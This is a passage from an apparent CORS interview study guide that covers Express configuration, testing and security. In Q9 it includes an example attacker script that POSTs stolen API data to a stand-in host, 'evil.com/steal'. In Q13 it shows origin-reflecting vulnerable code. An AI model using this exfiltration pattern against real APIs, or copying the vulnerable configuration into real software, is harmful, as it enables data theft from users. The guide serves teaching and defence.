id="2b4562ad-76f0-80a1-a2fa-fb251b892d42" class="bulleted-list"><li style="list-style-type:disc"><strong>Wildcard with credentials</strong> - Invalid combination</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8064-aa86-e87f3d7af84e" class="bulleted-list"><li style="list-style-type:disc"><strong>Preflight not handled</strong> - OPTIONS request not handled</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80d4-ad21-ec2984696c7f" class="bulleted-list"><li style="list-style-type:disc"><strong>Method/header not allowed</strong> - Request uses disallowed method/header</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-80d3-9070-f3854ed310e7" class="numbered-list" start="6"><li><strong>Verify Configuration:</strong><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8067-8c17-e8f9e388b0c4" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Check if origin is in allowed listconsole.log(&#x27;Request Origin:&#x27;, req.headers.origin);console.log(&#x27;Allowed Origins:&#x27;, allowedOrigins);console.log(&#x27;Is Allowed:&#x27;, allowedOrigins.includes(req.headers.origin));</code></pre></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-8060-a21f-fbfbcd316ef7" class="numbered-list" start="7"><li><strong>Check Browser DevTools:</strong><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80d5-a4e4-cf5c7aab0468" class="bulleted-list"><li style="list-style-type:disc">Network tab → Check request/response headers</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-804b-8b50-f69161fa6330" class="bulleted-list"><li style="list-style-type:disc">Console tab → Check for CORS errors</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80e0-853b-fcc4b3617d20" class="bulleted-list"><li style="list-style-type:disc">Application tab → Check CORS policy</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-80f1-aede-da2515d5f76e"/></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-80bf-847e-e38fae8eaea4" class="">Q8: Your API needs to support both web and mobile apps. How do you configure CORS?</h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-801a-acd4-d75c6720aed1" class=""><strong>Answer:</strong></p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-807e-b8e0-d1d5f8072428" class=""><strong>Key Considerations:</strong><br/>- Web apps: Subject to CORS (browser-enforced)<br/>- Mobile apps: Not subject to CORS (direct HTTP requests)</p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80c8-a260-cfd43a10bcd3" class=""><strong>Configuration:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-802a-b9ac-c86ff78bc8bb" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">const allowedOrigins = [
  &#x27;https://webapp.example.com&#x27;,  &#x27;https://admin.example.com&#x27;];app.use((req, res, next) =&gt; {
  const origin = req.headers.origin;  // CORS only applies to browser requests  // Mobile apps don&#x27;t send Origin header (or send different one)  if (origin &amp;&amp; allowedOrigins.includes(origin)) {
    res.setHeader(&#x27;Access-Control-Allow-Origin&#x27;, origin);    res.setHeader(&#x27;Access-Control-Allow-Credentials&#x27;, &#x27;true&#x27;);    res.setHeader(&#x27;Access-Control-Allow-Methods&#x27;, &#x27;GET, POST, PUT, DELETE&#x27;);    res.setHeader(&#x27;Access-Control-Allow-Headers&#x27;, &#x27;Content-Type, Authorization&#x27;);  }
  // Mobile apps bypass CORS, so use API keys/tokens for authentication  // Web apps use CORS + cookies/tokens  if (req.method === &#x27;OPTIONS&#x27;) {
    return res.sendStatus(200);  }
  next();});</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80e0-959e-e14aa69e578d" class=""><strong>Authentication Strategy:</strong><br/>- <strong>Web apps</strong>: CORS + cookies (with credentials)<br/>- <strong>Mobile apps</strong>: API keys or Bearer tokens (not subject to CORS)</p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80a3-a90c-c2cd0057cf94" class=""><strong>Alternative Approach:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80a6-b5c8-c5cb19a52ff9" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Different endpoints for web vs mobileapp.use(&#x27;/api/web/*&#x27;, cors(corsOptions));  // CORS enabledapp.use(&#x27;/api/mobile/*&#x27;, authenticateMobile);  // API key auth</code></pre></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-804b-bb29-c0059c60e7e8"/></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-806d-a54e-e0a74dfb4633" class="">Q9: You discover that your CORS configuration allows any origin. What are the security implications?</h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-807b-a6d6-e01f79beaadc" class=""><strong>Answer:</strong></p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80cb-94d4-e2f601db3a02" class=""><strong>Vulnerable Configuration:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8071-912b-ef64fa5f19a3" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80d5-98e7-d91bd9996079" class=""><strong>Security Implications:</strong></p></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-80a7-875e-e4077e39cb94" class="numbered-list" start="1"><li><strong>Any website can access your API:</strong><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80f6-b074-d18456f6170f" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Attacker&#x27;s website: evil.comfetch(&#x27;https://api.example.com/sensitive-data&#x27;, {
  credentials: &#x27;include&#x27;})
  .then(response =&gt; response.json())
  .then(data =&gt; {
    // Steal sensitive data    fetch(&#x27;https://evil.com/steal&#x27;, {
      method: &#x27;POST&#x27;,      body: JSON.stringify(data)
    });  });</code></pre></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-80ad-ac02-f5ad0feb6c9a" class="numbered-list" start="2"><li><strong>Credential exposure:</strong><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8017-899e-d816fd3504b4" class="bulleted-list"><li style="list-style-type:disc">Cookies sent with requests</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80ab-ad45-cbe4027395fe" class="bulleted-list"><li style="list-style-type:disc">Authentication tokens exposed</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80a0-95c0-e9ffa194c3c3" class="bulleted-list"><li style="list-style-type:disc">Session hijacking possible</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-8048-b1f0-eb500c3905da" class="numbered-list" start="3"><li><strong>Data leakage:</strong><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8027-8709-cc237185efcd" class="bulleted-list"><li style="list-style-type:disc">Sensitive user data accessible</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-800c-95e9-e247ad7f7060" class="bulleted-list"><li style="list-style-type:disc">API responses exposed</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8061-a9a2-f56a558faed2" class="bulleted-list"><li style="list-style-type:disc">Business logic revealed</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-80d4-830a-c579d8a3e4ca" class="numbered-list" start="4"><li><strong>CSRF attacks:</strong><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-802f-83ea-f1424a9e55da" class="bulleted-list"><li style="list-style-type:disc">Easier to perform CSRF attacks</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8049-87f5-fdab36735149" class="bulleted-list"><li style="list-style-type:disc">Can bypass some CSRF protections</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-806f-9517-ff768e6aa1a9" class=""><strong>Note:</strong> Browsers should reject <code>Access-Control-Allow-Origin: *</code> with credentials, but:<br/>- Some misconfigurations may still work<br/>- Direct requests (not browser) bypass this<br/>- Other vulnerabilities may exist</p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8022-b7cf-e7806b5bdb0f" class=""><strong>Fix:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80d0-b6da-c9297355f8fe" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Use specific originsconst allowedOrigins = [
  &#x27;https://example.com&#x27;,  &#x27;https://app.example.com&#x27;];app.use((req, res, next) =&gt; {
  const origin = req.headers.origin;  if (allowedOrigins.includes(origin)) {
    res.setHeader(&#x27;Access-Control-Allow-Origin&#x27;, origin);    res.setHeader(&#x27;Access-Control-Allow-Credentials&#x27;, &#x27;true&#x27;);  }
  next();});</code></pre></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-8062-b313-c7ec4bbdfa7e"/></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-8028-8468-f54fe845810c" class="">Q10: How do you handle CORS for a development environment vs production?</h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8002-ac66-cc57c021fe5f" class=""><strong>Answer:</strong></p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80d1-9b89-cf70a35beff7" class=""><strong>Configuration:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8069-a449-dc9cbc403329" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">const isDevelopment = process.env.NODE_ENV === &#x27;development&#x27;;const corsOptions = {
  origin: (origin, callback) =&gt; {
    if (isDevelopment) {
      // Development: Allow localhost      if (!origin || origin.startsWith(&#x27;http://localhost&#x27;) || origin.startsWith(&#x27;http://127.0.0.1&#x27;)) {
        callback(null, true);      } else {
        callback(new Error(&#x27;Not allowed in development&#x27;));      }
    } else {
      // Production: Strict origin list      const allowedOrigins = [
        &#x27;https://example.com&#x27;,        &#x27;https://app.example.com&#x27;      ];      if (allowedOrigins.includes(origin)) {
        callback(null, true);      } else {
        callback(new Error(&#x27;Not allowed by CORS&#x27;));      }
    }
  },  credentials: true,  methods: [&#x27;GET&#x27;, &#x27;POST&#x27;, &#x27;PUT&#x27;, &#x27;DELETE&#x27;],  allowedHeaders: [&#x27;Content-Type&#x27;, &#x27;Authorization&#x27;]
};app.use(cors(corsOptions));</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-804e-8435-ce6c5c23b656" class=""><strong>Alternative (Environment-based):</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8017-849f-de549ca6bb02" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">const corsConfig = {
  development: {
    origin: [&#x27;http://localhost:3000&#x27;, &#x27;http://localhost:3001&#x27;],    credentials: true  },  production: {
    origin: [&#x27;https://example.com&#x27;, &#x27;https://app.example.com&#x27;],    credentials: true  }
};const env = process.env.NODE_ENV || &#x27;development&#x27;;app.use(cors(corsConfig[env]));</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-806b-bffa-fe8927e1b167" class=""><strong>Best Practices:</strong><br/>- Use environment variables for configuration<br/>- Separate dev/prod CORS settings<br/>- Never use wildcard in production<br/>- Test CORS in both environments</p></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-8091-b109-de3dc68e7007"/></div><div style="display:contents" dir="auto"><h2 id="2b4562ad-76f0-806e-a96e-ea7fc0a8a1a8" class="">Implementation Questions</h2></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-80d9-9607-ee872d133c1d" class="">Q11: How do you implement CORS in Node.js/Express?</h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80bf-b69f-fe9f594c7e3d" class=""><strong>Answer:</strong></p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80cc-9c74-fac4c37f36ac" class=""><strong>Option 1: Manual Implementation</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-808f-a8f9-df41b54dc2ad" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">const express = require(&#x27;express&#x27;);const app = express();const allowedOrigins = [
  &#x27;https://example.com&#x27;,  &#x27;https://app.example.com&#x27;];// CORS middlewareapp.use((req, res, next) =&gt; {
  const origin = req.headers.origin;  if (allowedOrigins.includes(origin)) {
    res.setHeader(&#x27;Access-Control-Allow-Origin&#x27;, origin);    res.setHeader(&#x27;Access-Control-Allow-Credentials&#x27;, &#x27;true&#x27;);    res.setHeader(&#x27;Access-Control-Allow-Methods&#x27;, &#x27;GET, POST, PUT, DELETE&#x27;);    res.setHeader(&#x27;Access-Control-Allow-Headers&#x27;, &#x27;Content-Type, Authorization&#x27;);    res.setHeader(&#x27;Access-Control-Max-Age&#x27;, &#x27;86400&#x27;);  }
  // Handle preflight  if (req.method === &#x27;OPTIONS&#x27;) {
    return res.sendStatus(200);  }
  next();});app.get(&#x27;/api/data&#x27;, (req, res) =&gt; {
  res.json({ data: &#x27;value&#x27; });});</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8056-90a5-c3c7a89a86b4" class=""><strong>Option 2: Using cors middleware</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80f7-ad84-fa9190c5a0d8" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">const express = require(&#x27;express&#x27;);const cors = require(&#x27;cors&#x27;);const app = express();const corsOptions = {
  origin: (origin, callback) =&gt; {
    const allowedOrigins = [
      &#x27;https://example.com&#x27;,      &#x27;https://app.example.com&#x27;    ];    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);    } else {
      callback(new Error(&#x27;Not allowed by CORS&#x27;));    }
  },  credentials: true,  methods: [&#x27;GET&#x27;, &#x27;POST&#x27;, &#x27;PUT&#x27;, &#x27;DELETE&#x27;],  allowedHeaders: [&#x27;Content-Type&#x27;, &#x27;Authorization&#x27;],  maxAge: 86400};app.use(cors(corsOptions));app.get(&#x27;/api/data&#x27;, (req, res) =&gt; {
  res.json({ data: &#x27;value&#x27; });});</code></pre></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-80d5-a8cd-cf9c1875b251"/></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-8026-9e29-f0e3081be38a" class="">Q12: How do you test CORS configuration?</h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8052-adbb-d0547bf672e8" class=""><strong>Answer:</strong></p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8002-924d-e3b746603f18" class=""><strong>1. Manual Testing with curl:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-804b-88fb-c1e46222fb67" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all"># Test simple requestcurl -H &quot;Origin: https://example.com&quot; \     -v https://api.example.com/data
# Test preflightcurl -X OPTIONS \     -H &quot;Origin: https://example.com&quot; \     -H &quot;Access-Control-Request-Method: POST&quot; \     -H &quot;Access-Control-Request-Headers: Content-Type&quot; \     -v https://api.example.com/data
# Test with credentialscurl -H &quot;Origin: https://example.com&quot; \     -H &quot;Cookie: sessionId=abc123&quot; \     -v https://api.example.com/data</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-801b-8e62-d0404d474ae5" class=""><strong>2. Browser Testing:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80e4-bd97-fdbfd657470d" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Test in browser consolefetch(&#x27;https://api.example.com/data&#x27;, {
  credentials: &#x27;include&#x27;})
  .then(response =&gt; response.json())
  .then(data =&gt; console.log(data))
  .catch(error =&gt; console.error(&#x27;CORS error:&#x27;, error));</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8052-9a90-f83af5f1e59d" class=""><strong>3. Browser DevTools:</strong><br/>- Network tab → Check request/response headers<br/>- Console tab → Check for CORS errors<br/>- Application tab → Check CORS policy</p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8054-bb01-e929b50ed11d" class=""><strong>4. Automated Tools:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80ba-99c2-ec49bd651510" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all"># CORScannergit clone https://github.com/chenjj/CORScanner
python CORScanner.py -u https://api.example.com
# Burp Suite# Intercept request → Modify Origin header → Check response# OWASP ZAP# Automated CORS scanning</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-806a-932c-fea591afae3e" class=""><strong>5. Test Cases:</strong><br/>- ✅ Allowed origin should work<br/>- ❌ Disallowed origin should be blocked<br/>- ✅ Preflight should be handled<br/>- ❌ Wildcard with credentials should be rejected<br/>- ✅ Credentials should work with specific origin</p></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-80da-97a4-cdefb04e6f0a"/></div><div style="display:contents" dir="auto"><h2 id="2b4562ad-76f0-807b-9e90-c311f0e5317b" class="">Security &amp; Vulnerability Questions</h2></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-80f1-a92f-ea1df5d99176" class="">Q13: What is a CORS vulnerability and how can it be exploited?</h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80f3-82b6-ccce8f12e419" class=""><strong>Answer:</strong></p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80da-964d-f76db3ad3a97" class=""><strong>CORS Vulnerability:</strong><br/>A CORS vulnerability occurs when the server’s CORS configuration is overly permissive or incorrectly validates the Origin header, allowing unauthorized origins to access resources.</p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80a3-bd89-fb8442e20335" class=""><strong>Common Vulnerabilities:</strong></p></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-8027-a361-dd70ea2d18d2" class="numbered-list" start="1"><li><strong>Origin Reflection Without Validation:</strong><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8011-a586-d37a26653d7a" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Vulnerable codeapp.use((req, res) =&gt; {
  res.setHeader(&#x27;Access-Control-Allow-Origin&#x27;, req.headers.origin);  res.setHeader(&#x27;Access-Control-Allow-Credentials&#x27;, &#x27;true&#x27;);});</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80f5-a599-e58f6ec06fb0" class=""><strong>Exploitation:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8098-b878-c9eb8cd42b77" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all"># Attacker sends request with malicious origincurl -H &quot;Origin: https://evil.com&quot; https://api.example.com/data
# Server reflects itAccess-Control-Allow-Origin: https://evil.com
